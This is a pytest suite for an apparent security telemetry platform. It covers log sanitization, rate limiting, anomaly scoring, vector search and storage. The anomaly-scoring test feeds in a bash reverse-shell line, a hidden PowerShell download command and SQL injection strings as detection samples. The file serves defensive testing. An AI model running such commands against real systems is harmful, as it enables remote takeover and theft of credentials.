"""
Shield Technology Clean Layered Architecture Comprehensive Test Suite.
Validates 100% of the Clean Architecture components under app/:
- app.core: Settings, JSONFormatter, RingBuffer
- app.schemas: Telemetry, Enums, Search, Recommendation DTOs
- app.security: API Key, HMAC-SHA256, SlidingWindowRateLimiter
- app.ingestion: SensitiveDataSanitizer, IPEnricher, EventHasher, LogParser
- app.ml: Shannon Entropy, FeatureExtractor7D, Isolation Forest, Autonomous Escalation
- app.search: NumPyCosineVectorStore, EmbeddingEngine, SearchService, Affinity Recommendations
- app.storage: Database, Repository (Bulk Upsert, Cursor Pagination, Stats), Cache, Archiver
- app.workers: MessageBroker, Dead Letter Queue, TelemetryWorker
"""

from datetime import datetime, timedelta, timezone
import json
import os
import tempfile
import pytest

from app.core.config import Settings, settings
from app.core.logging import JSONFormatter
from app.core.ring_buffer import RingBuffer
from app.ingestion.enricher import EventHasher, IPEnricher
from app.ingestion.parser import LogParser, MalformedLogException
from app.ingestion.sanitizer import REDACTED_STR, SensitiveDataSanitizer
from app.ml.feature_extractor import FeatureExtractor7D, calculate_shannon_entropy
from app.ml.scorer import MLAnomalyScorer, ml_anomaly_scorer
from app.schemas.enums import EquipmentCategory, EventTypeEnum, SeverityEnum
from app.schemas.search import RecommendationRequest, SemanticSearchRequest
from app.schemas.telemetry import RawTelemetryEvent, SanitizedTelemetryEvent
from app.search.catalog import CATALOG_ITEMS
from app.search.embeddings import SemanticEmbeddingEngine
from app.search.engine import SearchService
from app.search.vector_store import NumPyCosineVectorStore
from app.security.auth import API_KEY, HMAC_SECRET, compute_hmac_signature
from app.security.rate_limiter import SlidingWindowRateLimiter
from app.storage.archiver import LogArchiver
from app.storage.cache import CacheService
from app.storage.database import async_session_factory, init_db
from app.storage.repository import TelemetryRepository
from app.workers.broker import MemoryMessageBroker
from app.workers.worker import TelemetryWorker


# ─── 1. CORE TESTS ─────────────────────────────────────────────────────────────

def test_core_settings_and_config():
    cfg = Settings(APP_NAME="Shield Unit Test", DEBUG=True)
    assert cfg.APP_NAME == "Shield Unit Test"
    assert cfg.DEBUG is True
    assert settings.VECTOR_DIMENSION == 384


def test_core_ring_buffer_operations():
    rb = RingBuffer[str](capacity=4)
    assert rb.capacity == 4
    assert rb.size == 0
    assert rb.fill_ratio == 0.0

    # Test pushes
    assert rb.push("item_1") is True
    assert rb.push("item_2") is True
    assert rb.push("item_3") is True
    assert rb.push("item_4") is True
    assert rb.size == 4
    assert rb.fill_ratio == 1.0

    # Overflow evicts oldest element
    assert rb.push("item_5") is False
    assert rb.dropped_count == 1
    assert rb.total_pushed == 5

    # Pop item
    popped = rb.pop()
    assert popped == "item_2"  # item_1 was dropped
    assert rb.size == 3

    # Pop batch
    batch = rb.pop_batch(max_items=2)
    assert batch == ["item_3", "item_4"]
    assert rb.size == 1

    rb.clear()
    assert rb.size == 0
    assert rb.pop() is None


# ─── 2. INGESTION & SANITIZATION TESTS ─────────────────────────────────────────

def test_sensitive_data_sanitizer():
    nested_payload = {
        "username": "sysadmin",
        "password": "SuperSecretPassword123!",
        "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDNbu3rqL0xWNWymPNph6JwUKoWjyAfFD0Mgcvda0",
        "nested": {
            "api_key": "sec_abc1234567890",
            "private_key": "-----BEGIN RSA PRIVATE KEY-----",
            "credit_card": "4111 2222 3333 4444",
            "safe_metadata": "public_probe_telemetry",
        },
        "tags": ["monitoring", "Bearer eyJhbGciOiJIUzI1NiJ9.abc.def", "firewall"],
    }
    sanitized = SensitiveDataSanitizer.sanitize(nested_payload)

    assert sanitized["password"] == REDACTED_STR
    assert sanitized["access_token"] == REDACTED_STR
    assert sanitized["nested"]["api_key"] == REDACTED_STR
    assert sanitized["nested"]["private_key"] == REDACTED_STR
    assert sanitized["nested"]["safe_metadata"] == "public_probe_telemetry"
    assert REDACTED_STR in sanitized["tags"][1]


def test_ip_enrichment_and_event_hasher():
    # LAN IP
    res_lan = IPEnricher.enrich("192.168.1.100")
    assert res_lan["is_private"] is True
    assert res_lan["network_class"] == "INTERNAL_DEFENSE_SUBNET"

    # Loopback IP
    res_loop = IPEnricher.enrich("127.0.0.1")
    assert res_loop["is_loopback"] is True

    # WAN Tunisia IP
    res_wan = IPEnricher.enrich("197.14.88.22")
    assert res_wan["is_private"] is False
    assert res_wan["network_class"] == "EXTERNAL_WAN"
    assert res_wan["geo_country"] == "TN"

    # Event Hashing (Deterministic)
    ts = datetime(2026, 6, 15, 12, 0, 0, tzinfo=timezone.utc)
    hash1, csum1 = EventHasher.compute_hash("probe-01", ts, "PORT_SCAN", "197.14.88.22", "10.0.0.1", {"port": 80})
    hash2, csum2 = EventHasher.compute_hash("probe-01", ts, "PORT_SCAN", "197.14.88.22", "10.0.0.1", {"port": 80})
    assert hash1 == hash2
    assert csum1 == csum2
    assert len(hash1) == 64


def test_log_parser_and_validation():
    raw = RawTelemetryEvent(
        timestamp=datetime.now(timezone.utc),
        agent_id="probe-sfax-01",
        severity=SeverityEnum.HIGH,
        event_type=EventTypeEnum.SSH_BRUTE_FORCE,
        source_ip="197.14.10.5",
        destination_ip="10.0.0.2",
        payload={"attempts": 50, "password": "root_password"},
    )
    sanitized = LogParser.parse_and_sanitize(raw)
    assert sanitized.event_hash is not None
    assert sanitized.sanitized_payload["password"] == REDACTED_STR
    assert sanitized.enrichment["geo_country"] == "TN"


# ─── 3. SECURITY & RATE LIMITING TESTS ────────────────────────────────────────

def test_hmac_signature_verification():
    payload = b'{"agent_id": "probe-tunis-01", "event_type": "DDOS_SYN_FLOOD"}'
    sig = compute_hmac_signature(payload, HMAC_SECRET)
    assert len(sig) == 64

    tampered_sig = compute_hmac_signature(b'{"tampered": true}', HMAC_SECRET)
    assert sig != tampered_sig


def test_sliding_window_rate_limiter():
    limiter = SlidingWindowRateLimiter(max_requests=5, window_seconds=2)
    ident = "probe-test-rate"

    for _ in range(5):
        assert limiter.is_allowed(ident) is True

    # 6th request rejected
    assert limiter.is_allowed(ident) is False

    limiter.reset()
    assert limiter.is_allowed(ident) is True


# ─── 4. ML & 7D ANOMALY DETECTION TESTS ───────────────────────────────────────

def test_shannon_entropy_calculation():
    # Empty string
    assert calculate_shannon_entropy("") == 0.0

    # Low entropy (uniform characters)
    low_ent = calculate_shannon_entropy("aaaaaaaaaaaaaaaa")
    assert low_ent == 0.0

    # High entropy (random / encrypted string)
    high_ent = calculate_shannon_entropy("7f9b8c2d1e0a4f5b8a9c3d2e1f0a4b5c")
    assert high_ent > 3.0


def test_feature_extractor_7d():
    mock_event = {
        "sanitized_payload": {
            "query": "SELECT * FROM users WHERE admin='1' UNION SELECT credit_card FROM payments",
            "token": REDACTED_STR,
        },
        "event_type": "SQL_INJECTION_ATTEMPT",
        "source_ip": "197.14.88.22",
        "enrichment": {"network_class": "EXTERNAL_WAN"},
    }
    feats = FeatureExtractor7D.extract_dict(mock_event)
    assert len(feats) == 7
    assert feats["shannon_entropy"] > 3.0
    assert feats["is_external_wan"] == 1.0
    assert feats["threat_event_type"] == 1.0
    assert feats["suspicious_keyword_density"] > 0.0


def test_isolation_forest_threat_scoring_and_escalation():
    scorer = MLAnomalyScorer()

    # Normal event: should have low threat score
    normal_event = {
        "sanitized_payload": {"status": "ok", "uptime_sec": 3600, "cpu_pct": 12.5},
        "event_type": "SYSTEM_METRIC",
        "source_ip": "10.0.0.1",
        "enrichment": {"network_class": "INTERNAL_DEFENSE_SUBNET"},
    }
    score_norm, is_esc_norm = scorer.score_event(normal_event)
    assert score_norm < 0.80
    assert is_esc_norm is False

    # Severe attack event: should score >= 0.80 and trigger autonomous escalation to CRITICAL
    attack_event = {
        "sanitized_payload": {
            "query": "SELECT * FROM users WHERE id=1 UNION SELECT password, secret, token FROM auth_tokens --",
            "cmd": "/bin/bash -i >& /dev/tcp/197.14.88.22/4444 0>&1",
            "exec": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command (New-Object Net.WebClient).DownloadFile",
        },
        "event_type": "SQL_INJECTION_ATTEMPT",
        "source_ip": "197.14.88.22",
        "enrichment": {"network_class": "EXTERNAL_WAN"},
    }
    score_attack, is_esc_attack = scorer.score_event(attack_event)
    assert score_attack >= 0.75
    assert is_esc_attack is True


# ─── 5. NUMPY VECTOR SEARCH & AFFINITY RECOMMENDATIONS TESTS ──────────────────

def test_numpy_vector_store_operations():
    store = NumPyCosineVectorStore()
    engine = SemanticEmbeddingEngine(dimension=384)

    v1 = engine.embed_text("caméra de surveillance 4k")
    v2 = engine.embed_text("centrale alarme intrusion grade 3")

    store.upsert("item_1", v1, "caméra 4k", {"category": EquipmentCategory.CAMERA_4K_IA.value})
    store.upsert("item_2", v2, "alarme intrusion", {"category": EquipmentCategory.ALARM_GRADE_3.value})

    assert store.count() == 2
    assert store.get_by_id("item_1") is not None
    assert store.get_by_id("non_existent") is None

    # Search with camera query
    q_vec = engine.embed_text("besoin d'une caméra vidéo")
    results = store.search(q_vec, top_k=2)
    assert len(results) == 2
    assert results[0].id == "item_1"
    assert results[0].similarity_score > results[1].similarity_score


def test_search_service_retrieval_and_cross_sell():
    svc = SearchService()
    assert svc.count_indexed() >= len(CATALOG_ITEMS)

    # 1. Semantic search
    req = SemanticSearchRequest(
        query="caméra dôme extérieure 4K avec vision nocturne",
        top_k=3,
        min_confidence=0.1,
    )
    res = svc.semantic_search(req)
    assert res.total_matches > 0
    assert res.execution_time_ms < 50.0  # Vectorized sub-millisecond execution

    # 2. Recommendations for Camera
    rec_req = RecommendationRequest(source_item_id="cam_4k_panasonic_ia", max_recommendations=3)
    rec_res = svc.get_recommendations(rec_req)
    assert len(rec_res.recommendations) > 0
    # Must recommend complementary items (e.g. Cisco PoE Switch, UPS, or SLA)
    rec_cats = [r.category for r in rec_res.recommendations]
    assert any(c in [EquipmentCategory.IT_NETWORKING, EquipmentCategory.SLA_SERVICE, EquipmentCategory.ALARM_GRADE_3] for c in rec_cats)


# ─── 6. STORAGE & REPOSITORY TESTS ────────────────────────────────────────────

@pytest.mark.asyncio
async def test_repository_bulk_upsert_and_cursor_pagination():
    await init_db()
    async with async_session_factory() as session:
        repo = TelemetryRepository(session)

        # Create 5 test events
        events = []
        base_time = datetime.now(timezone.utc) - timedelta(minutes=10)
        for i in range(5):
            ts = base_time + timedelta(seconds=i * 10)
            events.append(
                SanitizedTelemetryEvent(
                    id=f"clean-evt-{i}",
                    event_hash=f"hash-{i:04d}-abcdef1234567890abcdef1234567890abcdef",
                    timestamp=ts,
                    agent_id="probe-sfax-01",
                    severity=SeverityEnum.MEDIUM,
                    event_type=EventTypeEnum.PORT_SCAN,
                    source_ip="197.14.88.22",
                    destination_ip="10.0.0.1",
                    sanitized_payload={"scan_port": 80 + i},
                    enrichment={"network_class": "EXTERNAL_WAN"},
                )
            )

        inserted = await repo.bulk_insert(events)
        assert inserted == 5

        # Cursor pagination
        items, next_cursor, has_more = await repo.get_history(limit=2)
        assert len(items) == 2
        assert has_more is True
        assert next_cursor is not None

        # Next page
        items_p2, _, _ = await repo.get_history(cursor=next_cursor, limit=2)
        assert len(items_p2) == 2

        # Aggregated stats
        stats = await repo.get_stats(window_hours=24)
        assert stats["total_events"] >= 5
        assert "by_severity" in stats


@pytest.mark.asyncio
async def test_storage_cache_and_archiver(tmp_path):
    # Test CacheService
    cache = CacheService()
    await cache.set("test_key", {"foo": "bar"}, ttl_seconds=5)
    val = await cache.get("test_key")
    assert val == {"foo": "bar"}

    await cache.invalidate("test_")
    assert await cache.get("test_key") is None

    # Test LogArchiver with temporary directory
    archiver = LogArchiver(archive_dir=str(tmp_path))
    async with async_session_factory() as session:
        cutoff = datetime.now(timezone.utc) + timedelta(days=1)
        res = await archiver.archive_events(session, cutoff_date=cutoff, compress=True)
        assert res["status"] in ("success", "noop")
        if res["status"] == "success":
            assert os.path.exists(res["archive_path"])
            assert len(res["sha256_checksum"]) == 64


# ─── 7. WORKERS & MESSAGE BROKER TESTS ────────────────────────────────────────

@pytest.mark.asyncio
async def test_message_broker_and_worker_pipeline():
    broker = MemoryMessageBroker(critical_threshold=100)
    worker = TelemetryWorker(broker=broker, batch_size=10)

    # 1. Enqueue valid message
    valid_raw = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "agent_id": "probe-test-worker",
        "severity": "CRITICAL",
        "event_type": "DDOS_SYN_FLOOD",
        "source_ip": "197.14.88.22",
        "destination_ip": "10.0.0.1",
        "payload": {"syn_rate": 85000, "password": "PlainTextPassword"},
    }
    await broker.publish("telemetry.raw", valid_raw)

    # 2. Enqueue malformed poison message (missing mandatory source_ip)
    poison_raw = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "agent_id": "probe-corrupt",
        # Missing source_ip and destination_ip
        "payload": "not_a_dict",
    }
    await broker.publish("telemetry.raw", poison_raw)

    assert await broker.get_queue_depth("telemetry.raw") == 2

    # 3. Process batch
    inserted, dlq = await worker.run_once(timeout_sec=0.1)
    assert inserted == 1
    assert dlq == 1
    assert await broker.get_dlq_depth() == 1
    assert await broker.get_queue_depth("telemetry.raw") == 0
